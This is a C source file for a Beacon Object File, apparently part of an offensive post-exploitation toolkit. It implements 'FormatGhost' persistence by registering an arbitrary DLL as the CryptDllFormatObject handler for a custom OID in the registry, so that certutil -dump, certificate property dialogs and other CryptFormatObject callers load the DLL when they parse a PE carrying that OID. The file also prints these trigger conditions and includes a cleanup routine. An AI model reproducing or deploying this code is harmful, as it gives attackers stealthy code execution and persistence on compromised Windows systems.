/*
 * tmb_formatghost.c - CryptDllFormatObject OID handler persistence
 *
 * Registers a DLL as format handler for a custom OID.
 * Triggers when certutil -dump or cert UI parses a PE with that OID.
 *
 * Args: short action (0=register, 1=clean), char* oid, char* dll_path, char* funcname
 */

#include "tmb_bof.h"

void go(char *args, int alen) {
    if (!tmb_init()) { TMB_ERR("Failed to resolve NT API."); return; }

    datap parser;
    BeaconDataParse(&parser, args, alen);
    short action = BeaconDataShort(&parser);
    int oid_len = 0, dll_len = 0, func_len = 0;
    char *oid = BeaconDataExtract(&parser, &oid_len);
    char *dll_path = BeaconDataExtract(&parser, &dll_len);
    char *funcname = BeaconDataExtract(&parser, &func_len);

    if (!oid || !*oid) {
        TMB_ERR("--oid is required.");
        return;
    }

    wchar_t path[256];
    tmb_build_formatobject_path(oid, path);

    if (action == 0) {
        /* Register */
        if (!dll_path || !*dll_path) {
            TMB_ERR("--dll is required for registration.");
            return;
        }
        if (!funcname || !*funcname) funcname = "FormatObject";

        wchar_t wdll[260], wfunc[128];
        int i = 0;
        while (dll_path[i] && i < 259) { wdll[i] = (wchar_t)dll_path[i]; i++; }
        wdll[i] = 0;
        i = 0;
        while (funcname[i] && i < 127) { wfunc[i] = (wchar_t)funcname[i]; i++; }
        wfunc[i] = 0;

        if (tmb_reg_write_sip(path, wdll, wfunc)) {
            TMB_OK("FormatGhost handler registered.");
            TMB_INFO("  OID:      %s", oid);
            TMB_INFO("  DLL:      %s", dll_path);
            TMB_INFO("  Function: %s", funcname);
            TMB_INFO("  Triggers: certutil -dump, certificate property dialogs, any CryptFormatObject caller");
            TMB_WARN("Requires a PE with this OID in its PKCS#7 unsignedAttrs to trigger.");
            TMB_INFO("Undo: tmb_formatghost --oid %s --clean", oid);
        } else {
            TMB_ERR("Registration failed. Verify admin privileges.");
        }
    } else {
        /* Clean */
        HANDLE hk = tmb_reg_open(path, FALSE);
        if (hk) {
            NTSTATUS s = tmb_reg_delete(hk);
            g_nt.pNtClose(hk);
            if (s == 0) TMB_OK("FormatGhost handler removed for OID %s", oid);
            else TMB_NTERR("NtDeleteKey", s);
        } else {
            TMB_ERR("Key not found for OID %s", oid);
        }
    }
}
